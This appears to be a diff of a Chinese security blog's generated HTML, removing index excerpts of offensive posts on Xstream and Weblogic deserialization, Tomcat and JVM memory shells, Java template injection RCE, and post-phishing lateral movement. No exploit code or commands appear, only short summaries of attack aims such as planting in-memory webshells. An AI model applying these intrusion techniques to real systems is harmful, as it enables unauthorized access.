+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/10/31/%E6%88%B4%E7%9D%80%E9%95%A3%E9%93%90%E8%B7%B3%E8%88%9E-%E8%AE%B0%E4%B8%80%E6%AC%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%81%E7%AB%AF%E5%88%A9%E7%94%A8/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2025/08/25/%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%9A%84%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%E5%92%8Cdemo/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">内存马查杀的几种思路和demo</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -228,699 +390,14 @@
 
 
 
-
-  
-    <article id="post-Xstream最新反序列化poc执行报错问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/04/Xstream%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E6%89%A7%E8%A1%8C%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/">Xstream最新反序列化poc执行报错问题</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/04/Xstream%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E6%89%A7%E8%A1%8C%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2021-12-04T08:02:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近有个需求，用Xstream反序列化打个内存马，从通用性来讲，肯定用1.4.17的洞去打应用范围最广。众所周知，Xstream官方会提供其漏洞的poc。在我实验之下，1.4.17的几个poc只要涉及到任意java代码执行的都会报错，纯调用java.lang.Runtime.exec()的却不会报错。在我调试之下发现了其奥秘，本文就是解决Xstream任意java代码执行报错的问题。</p>
-        
-          <a class="article-more-a" href="/2021/12/04/Xstream%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E6%89%A7%E8%A1%8C%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Xstream相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/04/Xstream%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E6%89%A7%E8%A1%8C%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Weblogic404内存马" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/11/Weblogic404%E5%86%85%E5%AD%98%E9%A9%AC/">Weblogic404内存马</a>
-    </h1>
-  
-
-        
-        <a href="/2021/11/11/Weblogic404%E5%86%85%E5%AD%98%E9%A9%AC/" class="archive-article-date">
-  	<time datetime="2021-11-11T06:39:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>首先提出一个场景，目标使用了weblogic，存在t3反序列化漏洞，正常情况下回显都是使用rmi内存马，rmi内存马存在诸多缺点。首先容易被发现 貌似登录weblogic后台就能很轻易的看到，其次只能执行命令。当我们想传一个cs的马或者frp等进行后渗透时，还得用远程文件下载，如果目标有杀软就还需要考虑远程文件下载过杀软的问题，颇为麻烦，这时我们希望放一个功能性强的webshell上去，如：冰蝎、哥斯拉等，然而weblogic放jsp马问题也比较多，第一个需要找到本地目录，第二个需要找到外网可访问目录。设想如果我们直接访问这个weblogic是404，爆破又没找到任何目录，t3反序列化又打成了，那我们应该怎么放jsp上去。。。。。。这样就没得搞了。那么我们能不能在t3反序列化的时候直接给目标打一个http内存马呢，这就是我本文要讨论的问题。</p>
-        
-          <a class="article-more-a" href="/2021/11/11/Weblogic404%E5%86%85%E5%AD%98%E9%A9%AC/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">java相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/11/11/Weblogic404%E5%86%85%E5%AD%98%E9%A9%AC/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-tomcat6、7、8、9内存马" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/">tomcat6、7、8、9内存马</a>
-    </h1>
-  
-
-        
-        <a href="/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/" class="archive-article-date">
-  	<time datetime="2021-10-11T15:38:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在学习java内存马，发现一个现象，目前网上写的tomcat内存马基本都是在tomcat7、8、9三个版本使用，对于tomcat6却很少有内存马的文章出现。这样就会造成不全面的情况，因为tomcat6其实在项目中还是能遇到很多的，如果遇到总不能放弃。因此决定研究一下。本篇文章研究的内存马类型仅限于filter类型内存马。</p>
-        
-          <a class="article-more-a" href="/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">java相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java模板注入总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">Java模板注入总结</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/31/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2021-07-31T08:08:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在做一个代码审计项目，听同事说以前这个项目被挖过java模板注入RCE漏洞。突然发现以前没接触过java模板注入这个漏洞类型，因此做一个总结。本文不关注漏洞产生原理，只关注怎么用。</p>
-        
-          <a class="article-more-a" href="/2021/07/31/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">java相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-memshell源码解析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/">memshell源码解析</a>
-    </h1>
-  
-
-        
-        <a href="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-06-09T03:10:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近学习内存马，发现目前内存马主要集中在三个层面，1、原生的Servlet/Filter  2、框架封装的控制器 3、jvm层面(rebeyond的memshell，目前已集成在最新版冰蝎中)。前两种其实听的比较多，第三种听的比较少，研究了一下发现比较有意思，又学到了一个知识点。本文主要分析第三种内存马，以<a target="_blank" rel="noopener" href="https://github.com/rebeyond/memShell">memshell</a>工具为例。</p>
-        
-          <a class="article-more-a" href="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">工具分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-记一次极端环境下不出网机器上线" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/">记一次极端环境下不出网机器上线</a>
-    </h1>
-  
-
-        
-        <a href="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/" class="archive-article-date">
-  	<time datetime="2021-05-27T07:35:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>打某一次目标时，通过钓鱼进入了办公网和开发网(双网卡)。然后顺着开发网用ssh弱口令和weblogic、tomcat打了大概百来台机器，这是前提。</p>
-        
-          <a class="article-more-a" href="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">实战攻防</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SpringMVC源码学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/05/23/SpringMVC%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/">SpringMVC源码学习</a>
-    </h1>
-  
-
-        
-        <a href="/2021/05/23/SpringMVC%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2021-05-23T10:36:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>下图为springMVC接收到http请求时的执行流程图</p>
-<p><img src="/2021/05/23/SpringMVC%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/springMVC.png"></p>
-<p>使用源码：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/flowerwind/springMVCDemo">https://github.com/flowerwind/springMVCDemo</a></p>
-        
-          <a class="article-more-a" href="/2021/05/23/SpringMVC%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">java相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/05/23/SpringMVC%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Xstream反序列化命令执行研究-CVE-2021-21350" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/05/15/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2021-21350/">Xstream反序列化命令执行研究(CVE-2021-21350)</a>
-    </h1>
-  
-
-        
-        <a href="/2021/05/15/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2021-21350/" class="archive-article-date">
-  	<time datetime="2021-05-15T07:23:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>主要是宽字节发了泛微的xstream反序列化0day，就看了下xstream的CVE-2021-21350利用</p>
-        
-          <a class="article-more-a" href="/2021/05/15/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2021-21350/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Xstream相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/05/15/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2021-21350/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="weblogic-Jdk7u21新链-hw爆出" class="article article-type-weblogic  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/">Jdk7u21新链(hw爆出)</a>
-    </h1>
-  
-
-        
-        <a href="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2021-05-06T05:48:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>hw爆出的weblogic Jdk7u21绕过</p>
-        
-          <a class="article-more-a" href="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Weblogic相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -943,8 +420,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
